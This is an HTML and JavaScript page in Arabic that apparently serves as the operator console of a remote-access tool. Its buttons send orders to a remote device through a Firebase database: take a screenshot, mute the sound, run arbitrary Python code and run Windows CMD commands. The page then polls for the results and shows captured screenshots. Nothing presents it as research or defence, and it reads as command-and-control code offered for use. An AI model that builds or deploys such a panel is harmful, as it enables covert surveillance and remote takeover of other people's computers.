<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>لوحة تحكم المولى عبد العزيز</title>
    <style>
        body { background-color: #0d1117; color: #58a6ff; font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; padding: 20px; }
        .container { border: 2px solid #238636; border-radius: 15px; padding: 20px; max-width: 500px; margin: auto; background: #161b22; shadow: 0 0 20px #238636; }
        button { background-color: #238636; color: white; border: none; padding: 12px; margin: 10px; cursor: pointer; border-radius: 6px; width: 90%; font-weight: bold; transition: 0.3s; }
        button:hover { background-color: #2ea043; transform: scale(1.02); }
        textarea, input { width: 90%; padding: 10px; margin: 5px; border-radius: 5px; border: 1px solid #30363d; background: #0d1117; color: white; }
        #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 5px; color: #39ff14; font-family: 'Courier New', monospace; text-align: left; min-height: 50px; white-space: pre-wrap; }
        img { max-width: 100%; margin-top: 10px; border: 1px solid #58a6ff; }
    </style>
</head>
<body>
    <div class="container">
        <h1>لوحة تحكم المولى عبد العزيز</h1>
        <hr border-color="#30363d">
        
        <button onclick="sendCmd('screenshot', '')">📸 التقاط شاشة الجهاز</button>
        <button onclick="sendCmd('mute', '')">🔇 كتم / تشغيل الصوت</button>
        
        <textarea id="pyCode" rows="4" placeholder="أدخل كود بايثون لتشغيله..."></textarea>
        <button onclick="sendCmd('python', document.getElementById('pyCode').value)">🐍 تشغيل كود Python</button>
        
        <input type="text" id="cmdInp" placeholder="أمر CMD (مثال: systeminfo)">
        <button onclick="sendCmd('cmd', document.getElementById('cmdInp').value)">💻 تنفيذ أمر CMD</button>

        <div id="log">في انتظار أوامركم...</div>
        <div id="imgContainer"></div>
    </div>

    <script>
        // ضع رابط Firebase الخاص بك هنا (مهم جداً)
        const DB_URL = "https://YOUR-PROJECT-NAME.firebaseio.com/";

        async function sendCmd(action, data) {
            const log = document.getElementById('log');
            log.innerText = "جاري الإرسال للمولى...";
            
            await fetch(DB_URL + "order.json", {
                method: "PUT",
                body: JSON.stringify({ action, data, time: Date.now() })
            });

            // مراقبة الرد
            const check = setInterval(async () => {
                const res = await fetch(DB_URL + "reply.json");
                const reply = await res.json();
                if (reply && reply.time > Date.now() - 5000) {
                    clearInterval(check);
                    if (reply.type === "img") {
                        document.getElementById('imgContainer').innerHTML = `<img src="data:image/png;base64,${reply.content}">`;
                        log.innerText = "تم عرض الصورة بنجاح.";
                    } else {
                        log.innerText = reply.content;
                    }
                }
            }, 2000);
        }
    </script>
</body>
</html>
